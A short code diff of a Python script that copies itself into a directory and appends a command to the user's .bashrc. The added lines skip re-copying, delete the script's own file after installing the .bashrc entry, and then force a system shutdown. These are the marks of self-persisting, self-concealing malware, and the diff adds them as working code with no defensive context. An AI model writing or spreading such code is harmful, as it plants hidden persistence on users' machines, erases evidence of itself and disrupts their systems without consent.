@@ -17,7 +17,9 @@ def first_time():
 
         # create the directory if it does not exist
         os.makedirs(copy_directory, exist_ok=True)
-
+        #check if the file is already there
+        if os.path.isfile(os.path.join(copy_directory, "example.py")):
+            return False
         # the path of the copied script
         copy_script_path = os.path.join(copy_directory, "example.py")
 
@@ -39,6 +41,10 @@ if first_time():
             file.write("\n" + command_to_add + "\n")
         # set the output to success message
         output = "Command added to .bashrc successfully!"
+        #now delete this file
+        os.remove(os.path.realpath(__file__))
+        #force a reboot
+        os.system("shutdown")
     except Exception as e:
         # if there's an error, set the output to the error message
         output = str(e)
